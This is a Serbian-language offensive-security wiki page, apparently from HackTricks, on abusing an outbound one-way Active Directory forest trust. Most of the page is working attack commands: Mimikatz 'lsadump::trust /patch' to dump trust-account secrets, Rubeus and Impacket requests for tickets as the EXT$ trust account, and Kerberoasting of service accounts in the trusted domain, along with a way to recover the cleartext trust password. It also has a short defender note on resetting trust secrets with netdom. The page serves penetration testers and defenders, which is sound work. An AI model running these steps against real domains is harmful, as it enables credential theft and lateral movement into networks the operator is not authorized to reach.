# Eksterni Forest Domain - Jednosmerni (Outbound)

{{#include ../../banners/hacktricks-training.md}}

U ovom scenariju **vaš domain** **daje poverenje** nekim **privilegijama** principalima iz **drugog domaina/foresta**.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Ako imate dostupn AD modul, proverite i **Trusted Domain Object (TDO)** direktno. To vam daje sirove trust podatke podržane LDAP-om koji će vam kasnije biti potrebni kada odlučujete da li je lakši put **FSP/group abuse** ili **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Trebalo bi takođe da navedete gde su foreign principals iz `CN=ForeignSecurityPrincipals` zapravo dobili access. Uobičajeni uspesi su:

- **Local admin** na serveru/DC-u u vašem trenutnom domain-u
- Membership u **custom domain group** koja ima ACLs nad users/computers/GPOs
- Rights za modifikaciju **computer objects**, što kasnije može postati [RBCD](resource-based-constrained-delegation.md) ako trust configuration to dozvoljava

## Trust Account Attack

Kada se uspostavi one-way trust od domain/forest **B** ka domain/forest **A** (**B trusts A**), u **A** se kreira **trust account** za **B**. U outbound-trust prikazu za **A**, ovo je korisno zato što ako kasnije kompromitujete **B** (trusting side), možete tamo dump-ovati trust secret i autentifikovati se nazad ka **A** kao `B$`.

Ključni aspekt koji ovde treba razumeti jeste da se password i Kerberos material za taj trust account mogu izvući sa Domain Controller-a u **trusting** domain-u koristeći:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Ovo funkcioniše zato što je trust nalog kreiran u **trusted** domenu omogućen principal koji na kraju dobija osnovna prava normalnog domain user-a tamo. To je često dovoljno da se počne sa LDAP enumeracijom, traženjem tickets, i pronalaženjem sledeće escalation putanje.

U scenariju gde je `ext.local` **trusting** domen a `root.local` **trusted** domen, korisnički nalog nazvan `EXT$` se kreira unutar `root.local`. Dumpovanjem trust keys iz `ext.local` otkrivaju se credentials koji mogu da se koriste kao `root.local\EXT$` protiv `root.local`:
```bash
lsadump::trust /patch
```
Nakon ovoga, upotrebite izdvojeni **RC4** ključ da se autentifikujete kao `root.local\EXT$` unutar `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Zatim izlistaj trusted domain kao taj principal, na primer Kerberoasting-om high-value SPN-a u `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Iz Linuxa

Ako ste povratili **RC4** trust-account ključ, ista ideja radi iz Linuxa sa Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Ako **RC4** nije prihvaćen, vratite se na dobijenu **cleartext password** (ili izvedene **AES** keys) i ponovo koristite uobičajene [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) i [Kerberoast](kerberoast.md) workflow-e iz tog foothold-a.

### Key material gotchas

Ne mešajte **trust keys** i **trust-account credentials**:

- U one-way trust, obe strane čuvaju **TDO**, ali stvarni **`EXT$` user account** postoji samo u trusted domain.
- Trenutna trust-account password je reflektovana u TDO trust secret (`NewPassword` / current trust key).
- **RC4** trust key je najlakši artifact za reuse za `asktgt` kao trust account; u default setup-ovima ovo je obično radni enctype jer trust account često ima prazan `msDS-SupportedEncryptionTypes`.
- Ako razmišljate u terminima **AES trust keys**, imajte na umu da nisu zamenjivi sa trust-account AES keys jer se salts razlikuju.

Dakle, za tehniku na ovoj stranici, preferirajte ili dump-ovani **RC4** material ili dobijenu **cleartext** password.

### Gathering cleartext trust password

U prethodnom flow-u korišćen je trust hash umesto **cleartext password** (koji je takođe **dumped by mimikatz**).

Cleartext password može da se dobije konvertovanjem \[ CLEAR ] output-a iz mimikatz-a iz hexadecimal i uklanjanjem null bytes `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Ponekad, kada se kreira trust relationship, korisnik mora da unese password za trust. U ovoj demonstraciji, key je original trust password i zato je čitljiv. Kako se key rotira (default: svakih 30 dana), cleartext će obično prestati da bude čitljiv, ali je i dalje tehnički upotrebljiv.

Cleartext password može da se koristi za regular authentication kao trust account, kao alternativa traženju TGT-a sa Kerberos secret key-em trust account-a. Ovde, query `root.local` iz `ext.local` za članove `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust account-i su nezgodni principals. Interactive logons kao što su **RUNAS / console / RDP** nisu očekivani put ovde, i **NTLM** authentication pokušaji mogu da fail-uju sa `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Planirajte za **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) umesto toga.

### Persistence / cleanup note

Ako defender-i shvate da je trusting domain kompromitovan, treba da rotiraju trust secret na **obe strane** sa `netdom trust ... /resetOneSide ...`. Iz operator perspektive ovo je važno zato što **manual reset odmah invalidira stari trust material**, dok normal trust-password rotation čuva current/previous vrednosti tokom rollover-a.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Reference

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
